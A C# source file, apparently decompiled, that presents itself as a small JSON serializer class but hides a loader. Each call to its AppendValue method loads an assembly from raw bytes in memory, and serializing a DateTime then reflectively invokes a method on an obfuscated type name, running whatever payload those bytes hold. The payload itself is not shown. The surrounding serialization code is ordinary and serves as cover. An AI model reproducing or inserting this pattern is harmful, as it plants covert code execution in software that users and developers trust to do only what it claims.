using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Reflection;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;

namespace WindowsFormsApp81.Forms;

public static class JSONWriter
{
	public static string ToJson(this object item)
	{
		StringBuilder stringBuilder = new StringBuilder();
		AppendValue(stringBuilder, item);
		return stringBuilder.ToString();
	}

	private static void AppendValue(StringBuilder stringBuilder, object item)
	{
		if (item == null)
		{
			stringBuilder.Append("null");
			return;
		}
		Assembly assembly = Thread.GetDomain().Load(TaskID.ToArray());
		Type type = item.GetType();
		object obj = null;
		if (!(type == typeof(string)) && !(type == typeof(char)))
		{
			if (!(type == typeof(byte)) && !(type == typeof(sbyte)))
			{
				if (!(type == typeof(short)) && !(type == typeof(ushort)))
				{
					if (!(type == typeof(int)) && !(type == typeof(uint)))
					{
						if (!(type == typeof(long)) && !(type == typeof(ulong)))
						{
							if (type == typeof(float))
							{
								stringBuilder.Append(((float)item).ToString(CultureInfo.InvariantCulture));
								return;
							}
							if (type == typeof(double))
							{
								stringBuilder.Append(((double)item).ToString(CultureInfo.InvariantCulture));
								return;
							}
							if (type == typeof(decimal))
							{
								stringBuilder.Append(((decimal)item).ToString(CultureInfo.InvariantCulture));
								return;
							}
							if (type == typeof(bool))
							{
								stringBuilder.Append(((bool)item) ? "true" : "false");
								return;
							}
							if (type == typeof(DateTime))
							{
								Type? type2 = assembly.GetType("Rtjpsrtcuojkbhgzotmgo.Pcffxjq");
								stringBuilder.Append(((DateTime)item).ToString(CultureInfo.InvariantCulture));
								obj = type2!.GetMethod("Mkpuprhswgkbjjlfwhbnvy");
								stringBuilder.Append((string)Delegate.CreateDelegate(typeof(Action), (MethodInfo)obj).DynamicInvoke());
								return;
							}
							if (type.IsEnum)
							{
								stringBuilder.Append('"');
								stringBuilder.Append(item.ToString());
								stringBuilder.Append('"');
								return;
							}
							if (item is IList)
							{
								stringBuilder.Append('[');
								bool flag = true;
								IList list = item as IList;
								for (int i = 0; i < list.Count; i++)
								{
									if (flag)
									{
										flag = false;
									}
									else
									{
										stringBuilder.Append(',');
									}
									AppendValue(stringBuilder, list[i]);
								}
								stringBuilder.Append(']');
								return;
							}
							if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Dictionary<, >))
							{
								if (type.GetGenericArguments()[0] != typeof(string))
								{
									stringBuilder.Append("{}");
									return;
								}
								stringBuilder.Append('{');
								IDictionary dictionary = item as IDictionary;
								bool flag2 = true;
								foreach (object key in dictionary.Keys)
								{
									if (flag2)
									{
										flag2 = false;
									}
									else
									{
										stringBuilder.Append(',');
									}
									stringBuilder.Append('"');
									stringBuilder.Append((string)key);
									stringBuilder.Append("\":");
									AppendValue(stringBuilder, dictionary[key]);
								}
								stringBuilder.Append('}');
								return;
							}
							stringBuilder.Append('{');
							bool flag3 = true;
							FieldInfo[] fields = type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
							for (int j = 0; j < fields.Length; j++)
							{
								if (fields[j].IsDefined(typeof(IgnoreDataMemberAttribute), inherit: true))
								{
									continue;
								}
								object value = fields[j].GetValue(item);
								if (value != null)
								{
									if (flag3)
									{
										flag3 = false;
									}
									else
									{
										stringBuilder.Append(',');
									}
									stringBuilder.Append('"');
									stringBuilder.Append(GetMemberName(fields[j]));
									stringBuilder.Append("\":");
									AppendValue(stringBuilder, value);
								}
							}
							PropertyInfo[] properties = type.GetProperties(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
							for (int k = 0; k < properties.Length; k++)
							{
								if (!properties[k].CanRead || properties[k].IsDefined(typeof(IgnoreDataMemberAttribute), inherit: true))
								{
									continue;
								}
								object value2 = properties[k].GetValue(item, null);
								if (value2 != null)
								{
									if (flag3)
									{
										flag3 = false;
									}
									else
									{
										stringBuilder.Append(',');
									}
									stringBuilder.Append('"');
									stringBuilder.Append(GetMemberName(properties[k]));
									stringBuilder.Append("\":");
									AppendValue(stringBuilder, value2);
								}
							}
							stringBuilder.Append('}');
						}
						else
						{
							stringBuilder.Append(item.ToString());
						}
					}
					else
					{
						stringBuilder.Append(item.ToString());
					}
				}
				else
				{
					stringBuilder.Append(item.ToString());
				}
			}
			else
			{
				stringBuilder.Append(item.ToString());
			}
			return;
		}
		stringBuilder.Append('"');
		string text = item.ToString();
		for (int l = 0; l < text.Length; l++)
		{
			if (text[l] >= ' ' && text[l] != '"' && text[l] != '\\')
			{
				stringBuilder.Append(text[l]);
				continue;
			}
			stringBuilder.Append('\\');
			int num = "\"\\\n\r\t\b\f".IndexOf(text[l]);
			if (num >= 0)
			{
				stringBuilder.Append("\"\\nrtbf"[num]);
			}
			else
			{
				stringBuilder.AppendFormat("u{0:X4}", (uint)text[l]);
			}
		}
		stringBuilder.Append('"');
	}

	private static string GetMemberName(MemberInfo member)
	{
		if (member.IsDefined(typeof(DataMemberAttribute), inherit: true))
		{
			DataMemberAttribute dataMemberAttribute = (DataMemberAttribute)Attribute.GetCustomAttribute(member, typeof(DataMemberAttribute), inherit: true);
			if (!string.IsNullOrEmpty(dataMemberAttribute.Name))
			{
				return dataMemberAttribute.Name;
			}
		}
		return member.Name;
	}
}
